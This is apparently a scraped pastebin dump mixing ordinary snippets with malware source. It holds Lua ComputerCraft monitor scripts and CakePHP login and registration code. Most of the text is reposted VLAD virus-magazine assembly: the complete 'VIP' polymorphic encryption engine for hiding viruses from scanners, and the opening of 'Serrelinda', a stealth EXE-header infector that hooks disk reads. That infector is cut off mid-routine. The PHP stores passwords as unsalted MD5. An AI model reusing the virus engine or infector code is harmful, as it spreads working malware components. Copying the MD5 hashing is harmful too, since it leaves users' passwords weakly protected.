    return staple(d)
end

local function runProgram(side, monitor, filename, args)
    local env = setmetatable({peripheral = setmetatable({}, {__index=_ENV.peripheral})}, {__index=_ENV})
    local oldWrap = peripheral.wrap
    env.peripheral.wrap = function (s)
        if s == side then
            return monitor
        end
        return oldWrap(s)
    end
    loadfile(filename, ""t"", env)(table.unpack(args, 1, args.n))
end

local args = {...}
local argsLookup = {
    setup = function ()
        if #args < 4 then
            print(""Usage: staple setup <width> <height> <filename> [buffer?]"")
            return
        end
        local w = assert(tonumber(args[2]), help)
        local h = assert(tonumber(args[3]), help)
        local f = assert(fs.open(args[4], ""w""))
        local monitors = {}
        print(""Touch the monitors in order, from top left to bottom right."")
        for y = 1, h do
            monitors[y] = {}
            for x = 1, w do
                local _, side, _, _ = os.pullEvent(""monitor_touch"")
                local mon = peripheral.wrap(side) --[[@as Monitor]]
                local info = (""%s attached at (%u,%u)""):format(side, x, y)
                print(info)
                monitors[y][x] = side
                mon.setTextScale(1)
                local mw, mh = mon.getSize()
                mon.setTextScale(mw / (#info * 1.25))
                mw, mh = mon.getSize()
                mon.setBackgroundColor(2^((x+(y*w)) % 15))
                mon.clear()
                mon.setCursorPos((mw-#info)/2, mh/2)
                mon.write(info)
            end
        end
        monitors.buffer = not not args[5]
        f.write(textutils.serialise(monitors))
        f.close()
    end,
    load = function ()
        if #args < 4 then
            print(""Usage: staple load <filename> <side> <program_filename> <args...>"")
            return
        end
        local stapled = loadStaple(args[2])
        runProgram(args[3], stapled, args[4], table.pack(table.unpack(args, 5, args.n)))
    end,
    redirect = function ()
        if #args < 3 then
            print(""Usage: staple redirect <filename> <program>"")
            return
        end
        local stapled = loadStaple(args[2])
        term.redirect(stapled)
        shell.run(args[3])
    end
}

if #args == 2 and type(package.loaded[args[1]]) == ""table"" and not next(package.loaded[args[1]]) then
    return {
        staple = staple,
        load = loadStaple,
    }
end

-- running from commandline
if #args < 1 or not argsLookup[args[1]] then
    print(""Usage:"")
    for k,v in pairs(argsLookup) do
        print(""staple"",k)
    end
    return
end
return argsLookup[args[1]]()"
z8CfjwTz,Untitled,azkya,MySQL,Sunday 19th of November 2023 06:46:42 AM CDT,"    public function login()
    {
        $user = $this->Users->newEmptyEntity();
        if ($this->request->is('post', 'get')) {
            $param = $this->request->getData();
            $password = $param['password'];
            $query = $this->Users->find()
                ->where(['email' => $param['email'], 'password' => md5($password)])
                ->first();
            if (empty($query)) {
                $this->Flash->error(__(""Login Gagal.""));

                return $this->redirect(['action' => 'login']);
            }
            $this->Flash->success(__('Login Succes.'));
            return $this->redirect(['controller' => 'customers', 'action' => 'index']);
        }
        $this->set(compact('user'));
    }"
mS0hTMwp,multimonitor.lua,Geniusum,Lua,Sunday 19th of November 2023 06:37:25 AM CDT,"-- Liste des adresses des moniteurs
local moniteurs = {""monitor_9"", ""monitor_10"", ""monitor_11"", ""monitor_12"", ""monitor_13"", ""monitor_14""}

-- Charger l'image .nfp
local image = paintutils.loadImage(""chemin_vers_votre_image.nfp"")

-- Taille des moniteurs
local largeurMoniteur = 8
local hauteurMoniteur = 6

-- Diviser l'image en sections
local sections = {}
for y = 1, #moniteurs * hauteurMoniteur, hauteurMoniteur do
    for x = 1, #moniteurs * largeurMoniteur, largeurMoniteur do
        local section = {}
        for i = 1, hauteurMoniteur do
            section[i] = string.sub(image[y + i - 1], x, x + largeurMoniteur - 1)
        end
        table.insert(sections, section)
    end
end

-- Afficher sur les moniteurs
for i, adresse in ipairs(moniteurs) do
    local moniteur = peripheral.wrap(adresse)
    term.redirect(moniteur)
    moniteur.clear()
    moniteur.setTextScale(0.5)

    for _, section in ipairs(sections) do
        for _, ligne in ipairs(section) do
            print(ligne)
        end
    end

    term.redirect(term.native())
end"
xAEmy18F,VLAD Magazine - Issue #6 - ARTICLE.4_3 -  VLAD Infinite Polymorphic - VIP,FlyFar,ASM (NASM),Sunday 19th of November 2023 06:21:37 AM CDT,";
;               VLAD Infinite Polymorphic - VIP
;               by Qark - VLAD
;
; This engine is good in some respects, and poor in others.
; The encryption it creates is fairly easy to crack, being a looping
; xor with a keychange (all registers/values chosen at random),
; but the encryption loops are very hard to detect.  There are four
; different loop types, of which TBSCAN can only find two.
;
; At the start of the decryptor, the engine won't produce some instructions
; that flag heuristics.  For this reason, VIP avoids alot of the heuristic
; problems most other garbage generators have.  For example:
;  Doesn't produce INC/DEC in the first 20 bytes to avoid flags.
;  Doesn't produce memory operations in the first 10 bytes.
;  Doesn't produce XCHG in the first 10 bytes.
;  Always uses the short version of instructions (AX/AL Imm etc)
;
; One problem that couldn't be avoided is the creation of FFFF word pointers
; causing crashes.  The likelihood of them occurring is low (about 1 in 300
; samples) because danger instructions have been put to a minimum. 
; (eg mov ax,[bx-1] bx=0, isn't produced anymore).
;
; If you're wondering why the polymorphism produced isn't changing, that's
; because it's an example of slow polymorphism.
;
; To assemble, use it as an include file for the program that calls it.
;


VIP:
;On entry:
;       AL    = 1 if COM file
;       DS:SI = Points to the unencrypted virus
;       ES:DI = Place to store encrypted virus
;       CX    = length of virus
;       BP    = delta offset
;    Assumes CS=DS=ES
;On return:
;       CX    = length of decryptor + encrypted code

        cld
        mov     word ptr saved_cx,cx
        mov     word ptr saved_di,di
        mov     word ptr saved_si,si
        mov     byte ptr segtype,al
        mov     byte ptr inloop,0               ;Initialise variable

        ;Initialise our randomisation for slow polymorphism.
        call    init_rand

        ;Clear the register table

        call    unmark_all

        ;Clear the displacements
        call    clear_displacement

        ;Select a random decryption type.
rand_routine:
        call    get_rand
        mov     si,offset dec_type
        and     ax,3*2
        add     si,ax
        mov     ax,word ptr [si]
        jmp     ax

Standard:
;Uses 'standard' encryption.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;     loop:
;       xor     word ptr pointer,cipher
;       inc     pointer
;       inc     pointer
;       cmp     pointer,virus_start+virlength
;       jne     loop
;     virus_start:
; -----------------------------------------------

        call    startup                 ;Setup pointer and cipher

        mov     byte ptr inloop,1
        mov     word ptr loopstart,di

        call    encrypt_type

        or      al,0f8h
        mov     ah,al
        mov     al,81h                  ;CMP pointer,xxxx
        stosw

        call    round_up
        add     ax,word ptr pointer1val
        stosw

        call    handle_jne              ;JNE xx
        call    calc_jne

        mov     byte ptr inloop,0

        ;Calculate the displacement
        call    fix_displacements

        call    encrypt_virus

        call    decryptor_size

        ret

Stack1:
;Use the stack method for encryption.  This method doesnt work on EXE's
;because SS <> CS.
; ----This is a basic layout of the decryptor----
;       mov     sp,offset virus_start
;       mov     cipher,xor_val
;     loop:
;       pop     reg
;       xor     reg,cipher
;       push    reg
;       pop     randomreg
;       cmp     sp,virus_start+virus_length
;       jne     loop
; -----------------------------------------------

        cmp     byte ptr segtype,0
        jne     stack1_ok
        jmp     rand_routine
stack1_ok:
        call    rand_garbage
        call    rand_garbage
        mov     al,0bch         ;MOV SP,xxxx
        stosb
        mov     word ptr displace,di
        mov     ax,bp
        stosw

        call    setup_cipher
        
        mov     byte ptr inloop,1
        mov     word ptr loopstart,di

        call    select_reg
        call    rand_garbage
        push    ax
        or      al,58h                  ;POP reg
        stosb
        call    rand_garbage

        mov     al,33h                  ;XOR reg,reg
        stosb

        pop     ax
        push    ax
        push    cx
        mov     cl,3
        shl     al,3
        or      al,byte ptr cipher
        or      al,0c0h
        stosb
        pop     cx

        call    rand_garbage
        
        pop     ax
        or      al,50h          ;PUSH reg
        stosb

        call    rand_garbage
next_pop:
        call    get_rand
        call    check_reg
        jc      next_pop
        and     al,7
        or      al,58h          ;POP reg  (=add sp,2)
        stosb
        
        call    rand_garbage

        mov     ax,0fc81h               ;CMP SP,xxxx
        stosw
        mov     word ptr displace2,di
        
        call    round_up
        add     ax,bp
        stosw

        call    handle_jne
        call    calc_jne

        mov     byte ptr inloop,0

        mov     al,0bch         ;mov sp,0fffeh
        stosb
        mov     ax,0fffeh
        stosw

        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements

        mov     si,word ptr saved_si
        mov     cx,word ptr saved_cx
        inc     cx
        shr     cx,1
        mov     bx,word ptr xorval
enc_stack1:
        lodsw
        xor     ax,bx
        stosw
        loop    enc_stack1

        call    decryptor_size

        ret

Call_Enc:
;Uses recursive calls to decrypt the virus.  Needs a big stack or else it will
;crash.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;     loop:
;       cmp     pointer,virus_start+virus_length
;       jne     small_dec
;       ret
;     small_dec:
;       xor     word ptr pointer,cipher
;       inc     pointer
;       inc     pointer
;       call    loop
;       add     sp,virus_length-2
; -----------------------------------------------

        call    startup
        
        mov     byte ptr inloop,1

        mov     word ptr loopback,di
        call    rand_garbage

        mov     al,byte ptr pointer
        or      al,0f8h
        mov     ah,al
        mov     al,81h                  ;CMP pointer,xxxx
        stosw
        
        call    round_up
        add     ax,word ptr pointer1val
        stosw

        call    handle_jne

        mov     word ptr loopf,di
        stosb

        call    rand_garbage

        mov     al,0c3h                 ;RET
        stosb
        
        call    rand_garbage

        mov     ax,di                   ;Fix the JNE.
        mov     si,word ptr loopf
        inc     si
        sub     ax,si
        dec     si
        mov     byte ptr [si],al
        
        call    encrypt_type

        mov     al,0e8h                 ;CALL xxxx
        stosb
        mov     ax,di
        inc     ax
        inc     ax
        sub     ax,word ptr loopback
        neg     ax
        stosw

        mov     byte ptr inloop,0

        call    rand_garbage

        mov     ax,0c481h
        stosw
        mov     ax,word ptr saved_cx
        dec     ax
        dec     ax
        stosw

        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements
        
        call    encrypt_virus
        
        call    decryptor_size

        ret

Call_Enc2:
;Decrypts the virus from within a call.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;       call    decrypt
;       jmp     short virus_start
;     decrypt:
;       xor     pointer,cipher
;       inc     pointer
;       inc     pointer
;       cmp     pointer,virus_start+viruslength
;       jne     decrypt
;       ret
; -----------------------------------------------

        call    startup

        mov     byte ptr inloop,1

        mov     al,0e8h                 ;CALL xxxx
        stosb
        stosw
        mov     word ptr loopf16,di
        
        call    rand_garbage

        mov     al,0e9h                 ;JMP xxxx
        stosb
        mov     word ptr displace2,di
;        mov     ax,di
;        inc     ax
;        inc     ax
;        sub     ax,saved_di
;        neg     ax
        stosw

        call    rand_garbage
        call    rand_garbage

        mov     ax,di
        mov     si,word ptr loopf16
        sub     ax,si
        mov     word ptr [si-2],ax

        mov     word ptr loopstart,di

        call    encrypt_type
        
        or      al,0f8h
        mov     ah,al
        mov     al,81h          ;CMP pointer,xxxx
        stosw

        call    round_up
        add     ax,word ptr pointer1val
        stosw

        call    handle_jne
        call    calc_jne

        mov     al,0c3h                 ;ret
        stosb

        mov     byte ptr inloop,0

        call    rand_garbage

        mov     ax,di
        mov     si,word ptr displace2
        sub     ax,si
        dec     ax
        dec     ax
        mov     [si],ax
        mov     word ptr displace2,0

        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements
        
        call    encrypt_virus
        
        call    decryptor_size

        ret

        db      'VIP V1.0 by Qark/VLAD'


;All the different encryption types
dec_type        dw      offset stack1
                dw      offset call_enc
                dw      offset call_enc2
                dw      offset standard

segtype         db      0       ;1 if com file
saved_cx        dw      0       ;the initial CX
saved_di        dw      0       ;the initial DI
saved_si        dw      0

displace        dw      0
displace2       dw      0
                dw      0

displaceb       dw      0

inloop          db      0       ;=1 if inside a loop else 0
                                ;if set no 'word ptr' instructions made
loopstart       dw      0       ;for backwards 8 bit
loopf           dw      0       ;for forwards 8 bit
loopback        dw      0       ;backwards 16 bit
loopf16         dw      0       ;forwards 16 bit
xorval          dw      0

cipher          db      0

r_m             db      0       ;The r-m of the pointer

;�������������������������������������������������������
;General routines, used universally
;�������������������������������������������������������
Check_Reg:
;Returns a carry if the register in lower 3 bits of al is bad
        push    ax
        push    si
        and     ax,7
        mov     si,offset reg
        add     si,ax
        cmp     byte ptr [si],0
        pop     si
        pop     ax
        je      ok_reg
        stc
        ret
ok_reg:
        clc
        ret
        ;       ax,cx,dx,bx,sp,bp,si,di
reg     db      00,00,00,00,01,00,00,00

Mark_Reg:
;Mark a register as used, AL=reg
        push    ax
        push    si
        and     ax,7
        mov     si,offset reg
        add     si,ax
        mov     byte ptr [si],1
        pop     si
        pop     ax
        ret

UnMark_All:
;Clears the register table, and sets SP
        push    ax
        push    di
        push    cx
        mov     di,offset reg
        mov     al,0
        mov     cx,8
        cs:
        rep     stosb
        mov     byte ptr cs:[reg+4],1      ;set sp
        pop     cx
        pop     di
        pop     ax
        ret

Clear_Displacement:
;Clears all the displacement variables
        push    di
        push    ax
        mov     di,offset displace
        xor     ax,ax
        stosw
        stosw
        stosw
        stosw
        stosw
        pop     ax
        pop     di
        ret

Select_Pointer:
;Select an r-m as a pointer, you must call this routine before reserving
;any registers.  Updates the variable r_m.
        push    ax
        push    si
        call    get_rand
        and     ax,7
        mov     byte ptr r_m,al

        call    index_2_pointer
        mov     al,byte ptr [si]
        call    mark_reg
        inc     si
        mov     al,byte ptr [si]
        cmp     al,0
        je      no_pointer2
        call    mark_reg
no_pointer2:
        pop     si
        pop     ax
        ret

Setup_Pointer:
;Sets up the registers specified in the r-m with random values.  These
;values are put into the variable 'pointval'.
;Moves the instructions into ES:DI.
        push    ax
        push    si

        call    rand_garbage

        call    index_2_pointer
        mov     al,byte ptr [si]
        mov     byte ptr pointer,al
        or      al,0b8h                 ;MOV REG,xxxx
        stosb
        call    get_rand
        stosw
        mov     word ptr pointval,ax
        mov     word ptr pointer1val,ax

        call    rand_garbage

        mov     al,byte ptr [si+1]
        cmp     al,0
        je      no_setupp2

        or      al,0b8h                 ;MOV REG,xxxx
        stosb

        call    get_rand
        stosw
        add     word ptr pointval,ax

        call    rand_garbage

no_setupp2:

        pop     si
        pop     ax
        ret

Index_2_Pointer:
;Sets SI to the 'pointers' table of the r_m
        push    ax
        xor     ax,ax
        mov     al,byte ptr r_m
        shl     ax,1
        mov     si,offset pointers
        add     si,ax
        pop     ax
        ret

pointer         db      0               ;the first register
pointer1val     dw      0               ;the value of the first register
pointval        dw      0
Pointers        db      3,6     ;[bx+si]
                db      3,7     ;[bx+di]
                db      5,6     ;[bp+si]
                db      5,7     ;[bp+di]
                db      6,0     ;[si]
                db      7,0     ;[di]
                db      5,0     ;[bp]
                db      3,0     ;[bx]

Select_Reg:
;Reserves a random register, and passes it out in AL
;AH is destroyed
        call    get_rand
        call    check_reg
        jc      select_reg
        and     al,7
        call    mark_reg
        ret

Setup_Reg:
;Puts the value specified in BX, into the register specified in AL.
;-Needs Fixing- to add a possible SUB, and also the garbage generation needs
;to produce the same add/sub opcodes.

        push    ax
        push    bx

        call    rand_garbage

        and     al,7
        push    ax
        or      al,0b8h         ;MOV reg,xxxx
        stosb
        
        call    get_rand

        sub     bx,ax
        stosw

        call    rand_garbage

        pop     ax
        cmp     al,0
        jne     long_addreg
        mov     al,5            ;ADD AX,xxxx
        stosb
        jmp     short finish_add
long_addreg:
        or      al,0c0h
        mov     ah,al
        mov     al,81h
        stosw                   ;ADD reg,xxxx
finish_add:
        mov     ax,bx
        stosw
        
        call    rand_garbage

        pop     bx
        pop     ax
        ret

Seg_Override:
;Puts the correct segment before a memory write.  The memory write must be
;called immediately afterwards.
        push    ax
        cmp     byte ptr segtype,1
        je      no_segset
        mov     al,2eh          ;CS:
        stosb
no_segset:
        pop     ax
        ret

Fix_Pointer:
;Fixes up the mod/rm field of a pointer instruction.  Before this routine
;is called, the opcode field has already been stosb'd. eg for xor, 31h has
;been put into the current es:[di-1].
;on entry AL=register
;The displacement field (the following 2 bytes) must be fixed up manually.

        push    ax
        push    bx
        push    cx

        mov     cl,3
        shl     al,cl
        or      al,byte ptr r_m
        or      al,80h
        stosb

        pop     cx
        pop     bx
        pop     ax
        ret

Dec_Inc_Reg:
;Inc/Dec's the reg in AL. AH= 0=inc 1=dec
;No garbage generators are called in this routine, because the flags
;may be important.
        push    ax
        mov     byte ptr dec_inc,ah
        call    get_rand
        test    al,1
        pop     ax
        push    ax
        jnz     do_inc_dec
        cmp     al,0            ;check for ax
        jne     not_ax_incdec
        mov     ax,0ff05h       ;ADD AX,ffff  = DEC AX
        cmp     byte ptr dec_inc,0
        jne     fdec1
        mov     al,2dh          ;SUB
fdec1:
        stosw
        mov     al,0ffh
        stosb
        pop     ax
        ret
not_ax_incdec:
        cmp     byte ptr dec_inc,0
        je      fdec2
        or      al,0c0h
        jmp     short fdec3
fdec2:
        or      al,0e8h
fdec3:
        mov     ah,al
        mov     al,83h          ;ADD reg,ffff = DEC reg
        stosw
        mov     al,0ffh
        stosb
        pop     ax
        ret
do_inc_dec:
        or      al,40h          ;INC reg
        cmp     byte ptr dec_inc,0
        je      fdec4
        or      al,8
fdec4:
        stosb
        pop     ax
        ret
dec_inc db      0               ;0=inc 1=dec

Round_Up:
;Rounds up the number in saved_cx to the nearest 2 and passes it out in AX.
        mov     ax,word ptr saved_cx
        inc     ax
        shr     ax,1
        shl     ax,1
        mov     word ptr saved_cx,ax
        ret

Fix_Displacements:
;Adds the size of the produced decyptors to the data listed in the
;displacement variables. 0 Values signal the end.
;DI=The final length of the 'decryptor'

        push    ax
        push    si
        
        mov     ax,di
        sub     ax,word ptr saved_di
        push    di
        mov     si,offset displace
disp_loop:
        cmp     word ptr [si],0
        je      last_displacement
        mov     di,[si]
        add     [di],ax
        inc     si
        inc     si
        jmp     short disp_loop
last_displacement:
        pop     di
        pop     si
        pop     ax
        ret

Rand_Garbage:
;Generates 1-4 garbage instructions.
        push    ax
        call    get_rand
        and     ax,07h
        push    cx
        mov     cx,ax
        inc     cx
start_garbage:
        call    select_garbage
        loop    start_garbage
        pop     cx
        pop     ax
        ret

Select_Garbage:
;Selects a garbage routine to goto
        
        call    get_rand
        and     ax,14
        push    si
        mov     si,offset calls
        add     si,ax
        mov     ax,word ptr [si]
        pop     si
        jmp     ax

calls   dw      offset Make_Inc_Dec
        dw      offset Imm2Reg
        dw      offset Rand_Instr
        dw      offset Mov_Imm
        dw      offset Make_Xchg
        dw      offset Rand_Instr
        dw      offset Mov_Imm
        dw      offset Imm2Reg

Make_Inc_Dec:
;Puts a word INC/DEC in ES:DI
;eg INC  AX
;   DEC  BP

        mov     ax,di
        sub     ax,word ptr saved_di
        cmp     ax,15
        ja      not_poly_start          ;inc/dec in the first 20 bytes, flags
        ret
not_poly_start:
        call    get_rand
        call    check_reg
        jc      make_inc_dec
        and     al,0fh
        or      al,40h
        
        test    al,8
        jnz     calc_dec

        stosb
        ret
calc_dec:
        mov     ah,al
        and     al,7
        cmp     al,2
        ja      Make_Inc_Dec
        mov     al,ah
        stosb
        ret

Fix_Register:
;AX=random byte, where the expected outcome is ah=opcode al=mod/rm
;Carry is set if bad register.  Word_Byte is updated to show word/byte.
        test    ah,1
        jnz     word_garbage
        mov     byte ptr word_byte,0
        call    check_breg
        jmp     short byte_garbage
word_garbage:
        mov     byte ptr word_byte,1
        call    check_reg
byte_garbage:
        ret        
word_byte       db      0       ;1=word, 0 = byte


Imm2Reg:
;Immediate to register.
        call    get_rand
        call    fix_register
        jc      imm2reg
        test    al,7            ;AX/AL arent allowed (causes heuristics)
        jz      imm2ax
        xchg    al,ah
        and     al,3
        cmp     al,2            ;signed byte is bad
        je      imm2reg
        or      al,80h
        or      ah,0c0h
        stosw
        test    al,2            ;signed word
        jnz     ione_stosb
        call    get_rand
        cmp     byte ptr word_byte,1
        jne     ione_stosb
        stosb
ione_stosb:
        call    get_rand
        stosb
        ret
imm2ax:
        xchg    ah,al
        and     al,3dh
        or      al,4
        stosw
        test    al,1
        jnz     ione_stosb
        ret

Rand_Instr:
;Creates a whole stack of instructions.
;and,or,xor,add,sub,adc,cmp,sbb

        mov     ax,di
        sub     ax,word ptr saved_di
        cmp     ax,10
        ja      not_poly_start2         ;in the first 20 bytes, flags G
        ret
not_poly_start2:
        call    get_rand
        ;Inloop stops xxx xx,word ptr [xxxx] instructions inside the
        ;loops.  It changes them to 'byte ptr' which stops the ffff crash
        ;problem.
        cmp     byte ptr inloop,1
        jne     ok_words
        and     ah,0feh
ok_words:
        call    fix_register
        jc      rand_instr
        push    cx
        mov     cl,3
        rol     al,cl
        pop     cx
        xchg    ah,al
        and     al,039h
        or      al,2            ;set direction flag
        stosb
        mov     al,ah
        and     al,0c0h
        cmp     al,0c0h
        je      zerobytedisp
        cmp     al,0
        je      checkdisp
        cmp     al,80h
        je      twobytedisp
        ;sign extended
        mov     al,ah
        stosb
negative_value:
        call    get_rand
        cmp     al,0ffh
        je      negative_value
        stosb
        ret
twobytedisp:
        mov     al,ah
        stosb
        call    get_rand
        stosw
        ret
checkdisp:
        push    ax
        and     ah,7
        cmp     ah,6
        pop     ax
        je      twobytedisp
zerobytedisp:
        mov     al,ah
        stosb
        ret

Mov_Imm:
;Puts a MOV immediate instruction.
        call    get_rand
        test    al,8
        jnz     word_mov
        call    check_breg
        jmp     short mov_check
word_mov:
        call    check_reg
mov_check:
        jc      mov_imm
        and     al,0fh
        or      al,0b0h
        stosb
        test    al,8
        jnz     mov_word
        call    get_rand
        stosb
        ret
mov_word:
        call    get_rand
        stosw
        ret

Init_Rand:
;Initialises the Get_Rand procedure.
        push    ax
        push    cx
        push    dx
        push    si
        push    ds
        mov     si,1
        mov     ax,0ffffh               ;Get word from ROM BIOS.
        mov     ds,ax
        mov     ax,word ptr [si]
        pop     ds
        mov     word ptr randseed,ax
        call    get_rand
        push    ax
        mov     ah,2ah                  ;Get Date.
        int 21h ;call   int21h
        pop     ax
        add     ax,cx
        xor     ax,dx
        mov     word ptr randseed,ax
        call    get_rand
        pop     si
        pop     dx
        pop     cx
        pop     ax
        ret

Get_Rand:
;Gets a random number in AX.
        push    cx
        push    dx
        mov     ax,word ptr randseed
        mov     cx,ax
        mov     dx,ax
        and     cx,1ffh
        or      cl,01fh
propogate:
        add     dx,ax
        mul     dx
        add     ax,4321h
        neg     ax
        ror     dx,1
        loop    propogate
        mov     word ptr randseed,ax
        
        pop     dx
        pop     cx
        ret
randseed        dw      0

Make_Xchg:
        mov     ax,di
        sub     ax,word ptr saved_di
        cmp     ax,10
        ja      not_poly_start3         ;inc/dec in the first 20 bytes, flags
        ret
not_poly_start3:

        call    get_rand
        call    fix_register
        jc      make_xchg
        push    cx
        mov     cl,3
        rol     al,cl
        pop     cx
        call    fix_register
        jc      make_xchg
        test    ah,1
        jz      xchg_8bit
        test    al,7
        jz      xchg_ax2
        test    al,38h
        jz      xchg_ax1
xchg_8bit:
        and     ax,13fh
        or      ax,86c0h
        xchg    ah,al
        stosw
        ret
xchg_ax1:
        and     al,7
        or      al,90h
        stosb
        ret
xchg_ax2:
        push    cx
        mov     cl,3
        ror     al,cl
        pop     cx
        jmp     short xchg_ax1

Check_bReg:
;Checks if an 8bit reg is used or not.
;AL=register
        push    ax
        and     al,3
        call    check_reg
        pop     ax
        ret

Decryptor_Size:
;Calculate the size of the decryptor + code
;Entry: DI=everything done
;Exit : CX=total decryptor length

        mov     cx,di
        sub     cx,word ptr saved_di
        ret

Setup_Cipher:
;Randomly selects a cipher register and initialises it with a value.
;Puts the register into the variable 'cipher' and the value into 'xorval'

        call    rand_garbage
        call    get_rand
        mov     bx,ax
        mov     word ptr xorval,ax
        call    select_reg
        mov     byte ptr cipher,al
        call    setup_reg
        call    rand_garbage
        ret

Startup:
;Does the most common startup procedures.  Puts some garbage, and sets
;up the pointer register.

        call    rand_garbage
        call    rand_garbage
        call    select_pointer          ;Setup pointer
        call    setup_pointer

        call    setup_cipher
        ret

Handle_JNE:
;Randomly puts either JNE or JB at ES:DI.
;Must be called after the CMP instruction.
        push    ax
        push    si

        ;Test to make sure our pointer isnt going +ffff, if so, only use
        ;jne, not jnb.
        call    round_up
        add     ax,word ptr pointer1val
        jnc     random_jne
        mov     al,75h
        jmp     short unrandom_jne
random_jne:

        call    get_rand
        and     ax,1
        mov     si,offset jne_table
        add     si,ax
        mov     al,byte ptr [si]
unrandom_jne:
        stosb
        pop     si
        pop     ax
        ret

jne_table       db      75h     ;JNE/JNZ
                db      72h     ;JB/JNAE

Calc_JNE:
;Calculates the distance needed to JMP backwards and puts it into ES:DI.
;On entry DI points to the byte after a JNE/JB instruction
;         and 'loopstart' contains the offset of the loop.

        push    ax
        mov     ax,di
        inc     ax
        sub     ax,word ptr loopstart
        neg     al
        stosb
        call    rand_garbage
        pop     ax
        ret

Increase_Pointer:
;Increases the register specified in 'pointer' by two.
;On exit AL=pointer register.

        call    rand_garbage
        xor     ax,ax
        mov     al,byte ptr pointer
        call    dec_inc_reg
        call    rand_garbage
        call    dec_inc_reg
        call    rand_garbage
        ret

Encrypt_Type:
;Selects the type of encryption and sets everything up.
        call    rand_garbage
        call    seg_override

        call    rand3
        mov     al,byte ptr [si+1]
        mov     byte ptr encbyte,al

        mov     al,byte ptr [si]        ;The instruction from 'enc_table'
        stosb

        mov     al,byte ptr cipher
        call    fix_pointer
        mov     word ptr displace,di
        
        mov     ax,bp
        sub     ax,word ptr pointval
        stosw

        call    rand_garbage
        
        call    rand3
        mov     al,byte ptr [si+2]
        or      al,0c3h
        mov     byte ptr encb2,al
        
        cmp     byte ptr cipher,0
        jne     fix_16imm
        mov     al,byte ptr [si+2]
        or      al,5
        stosb
        jmp     short set_imm

fix_16imm:
        mov     al,81h
        stosb
        mov     al,byte ptr [si+2]
        or      al,0c0h
        or      al,byte ptr cipher
        stosb

set_imm:
        call    get_rand
        stosw

        mov     word ptr encval2,ax

        call    increase_pointer

        ret

enc_table       db      31h     ;XOR            ;Direct word operation
                db      33h     ;XOR reg,reg    ;Undo..
                db      30h

                db      01h     ;ADD
                db      2bh     ;SUB reg,reg
                db      0       ;ADD

                db      29h     ;SUB
                db      03h     ;ADD reg,reg
                db      28h

Rand3:
;Gets a number in ax, either 0,4,8, and indexes SI that distance into
;enc_table.
encrypt_rand:
        call    get_rand
        mov     cx,3
        xor     dx,dx
        div     cx
        mov     ax,dx
        xor     dx,dx
        mul     cx
        mov     si,offset enc_table
        add     si,ax
        ret

Encrypt_Virus:
        mov     si,word ptr saved_si
        mov     cx,word ptr saved_cx
        inc     cx
        shr     cx,1
        mov     bx,word ptr xorval
enc_loop:
        lodsw

        ;op ax,bx
        encbyte db      0       ;op
                db      0c3h

                db      81h
        encb2   db      0
        encval2 dw      0

        stosw
        loop    enc_loop
        ret
"
2AdtbMEu,Untitled,azkya,MySQL,Sunday 19th of November 2023 06:21:26 AM CDT," public function regristation()
    {
        $user = $this->Users->newEmptyEntity();
        if ($this->request->is('post')) {
            $param = $this->request->getData();
            $user = $this->Users->patchEntity($user, $this->request->getData());
            $user->uid = Text::uuid();
            $user->password = md5($param['password']);
            if ($this->Users->save($user)) {
                $this->Flash->success(__(""Regristation Success.""));

                return $this->redirect(['action' => 'regristation']);
            }
            $this->Flash->error(__('Not able to regristation'));
        }
        $this->set(compact('user'));
    }"
CaczQreX,VLAD Magazine - Issue #6 - ARTICLE.5_3 - Serrelinda - EXE Header Infector,FlyFar,ASM (NASM),Sunday 19th of November 2023 06:13:13 AM CDT,"; Serrelinda, an EXE header infector by Rhincewind [Vlad]
;
; This is a fullstealth header infector with a twist: it goes resident
; underneath the hosting program, does not convert hosts to COM structure
; and is capable of restoring the host in memory (no reexecution).
; In short, it's the old principle all over again in a new implementation.
;
; Viruscode is inserted into the zerospace in suitable EXE headers, suitable
; meaning: no relocation items and a headersize of 512 bytes. The trick is
; to set the headersize to 32 bytes, and just zero CS:IP. This will cause
; the viruscode to be loaded below the host's code, giving the following
; memory order: MCB PSP VIRUS HOST. The virus switches context before copying
; itself over the PSP. The original MCB is adjusted to reflect the virussize
; and interpreter-ownership, and a 2nd MCB is created above the viruscode. 
; Finally, a new PSP is created, and we have: MCB VIRUS MCB PSP HOST which
; is in a word, great. The only drawback is the memory fragmentation
; caused by the environment block no longer being attached to it's owning
; PSP. (non-consecutive MCBs with same ID field).
;
; Header infection is done on sector reads. A suitable header is read,
; infected, written back and then stealthed before it's returned.
; This is Serrelinda's safeguard. If ever you infect some files by accident, 
; just copy them and reboot. Voila, la disinfection.
;
; Oh FYI, TbClean bails on int 21, ah=55 or ah=26 (create PSP). 
; More on Frans' jumptables later.
;
; Rhince.

                .model tiny
                .code
                org 0
viruslen        equ (endvirus-start)
start:         
                xor di,di
                mov si,di
                mov bx, word ptr ds:[si+16h]
                mov ah, 50h
                int 21h
                mov cx, 00ffh
                push cx
                push word ptr ds:[si+2ch]
                push cs
                pop ds
                rep movsb
                mov virseg,es
                jmp $+2
                db 0eah
                dw offset low_entry
virseg          dw 0
low_entry:      mov cx, viruslen-0ffh
                rep movsb
                mov ax,cs
                dec ax
                mov ds,cx
                mov si,13h*4
                movsw
                movsw
                mov si,ds
                mov ds,ax
                mov di, 1d0h
                mov al, 'M'
                xchg al, byte ptr ds:[si]
                stosb
                scasw
                mov word ptr ds:[si+1],bx
                mov ax, 01dh
                xchg word ptr ds:[si+3],ax
                sub ax, word ptr ds:[si+3]
                stosw
                mov dx,es
                add dx,1eh
                mov ah, 55h
                int 21h
                mov word ptr es:[di-4],dx
                pop cx
                dec cx
                mov es,cx
                mov word ptr es:[1],dx
                push dx
                mov ax, offset int13+10h
                mov dx, 2513h
                xchg ax,dx
                int 21h
installed:      pop bx
                mov ds,bx
                mov es,bx
                add bx, 10h
                add word ptr cs:[jmp_cs],bx
                inc cx
                mov word ptr ds:[2ch], cx
                pop cx
                xor ax,ax
                mov bx,ax
                mov si,ax
                mov di,sp
                jmp $+2
                db 0eah
jmp_ip          dw 0
jmp_cs          dw -10h
int13:                
                cmp ah,2
                jz do_it
go_go_int13:
                jmp go_int13
do_it:
                pushf
                call dword ptr cs:int13offset+10h
                push ax
                pushf
